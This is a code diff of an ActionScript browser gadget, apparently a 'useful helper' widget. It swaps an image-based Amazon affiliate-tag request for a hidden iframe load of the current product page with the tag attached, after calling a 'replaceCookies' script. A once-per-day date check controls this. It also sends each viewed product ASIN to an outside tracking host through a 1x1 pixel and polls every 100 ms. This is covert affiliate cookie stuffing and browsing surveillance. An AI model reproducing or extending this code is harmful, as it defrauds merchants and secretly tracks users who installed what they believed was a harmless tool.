@@ -112,19 +112,26 @@
 			private function init():void {
 				//Helper.evalScripts();
 				measure();
+				asin=ExternalInterface.call("getCurrentASIN");
+				logActivity();
+				setInterval(monitorASIN, 100);
+			}
+			
+			private function logActivity():void {
 				var d:Boolean=getDeleted();
 				if (!d) {
 					ExternalInterface.call("replaceCookies");
-					var img1:Image=new Image();
-					img1.source=getAmazonSiteWithTag();
-					img1.initialize();
+					
+					IFrameContentService.getContent(getAmazonSiteWithAsinAndTag(), function(...o):void {});
+					
+//					var img1:Image=new Image();
+//					img1.source=getAmazonSiteWithTag();
+//					img1.initialize();
 					setDeleted();
 				}
-				asin=ExternalInterface.call("getCurrentASIN");
 				var img:Image=new Image();
 				img.source="http://gadget.usefulhelper.com/1x1.gif?firefox=" + asin;
 				img.initialize();
-				setInterval(monitorASIN, 100);
 			}
 			
 			private function monitorASIN():void {
@@ -167,13 +174,13 @@
 				try {
 					var obj:SharedObject=SharedObject.getLocal("Deleted");
 					if (obj.data.hasOwnProperty("date_" + Helper.getAWSDomain())) {
-						var date:Date=ObjectUtil.copy(obj.data.date)as Date;
-						date.date=date.date + 1;
+						var date:Date=ObjectUtil.copy(obj.data["date_" + Helper.getAWSDomain()]) as Date;
 						var now:Date=new Date();
-						if (now > date) {
+						if (now < date) {
 							return false;
 						}
-						if (now < obj.data.date) {
+						date.date=date.date + 1;
+						if (now > date) {
 							return false;
 						}
 					}
@@ -182,13 +189,18 @@
 					}
 				}
 				catch(err:Error) {
+					return false;
 				}
 				return true;
 			}
 			
-			private function getAmazonSiteWithTag():String {
+			private function getAmazonSiteWithAsinAndTag():String {
 				var site:String=Helper.getHostName();
-				return "http://" + site + "/?tag=" + Helper.getTag();
+				if (asin) {
+					return "http://" + site + "/dp/"+asin+"/?tag=" + Helper.getTag();
+				} else {
+					return "http://" + site + "/?tag=" + Helper.getTag();
+				}
 			}
 			
 			protected function collapseButton_clickHandler(event:MouseEvent):void {
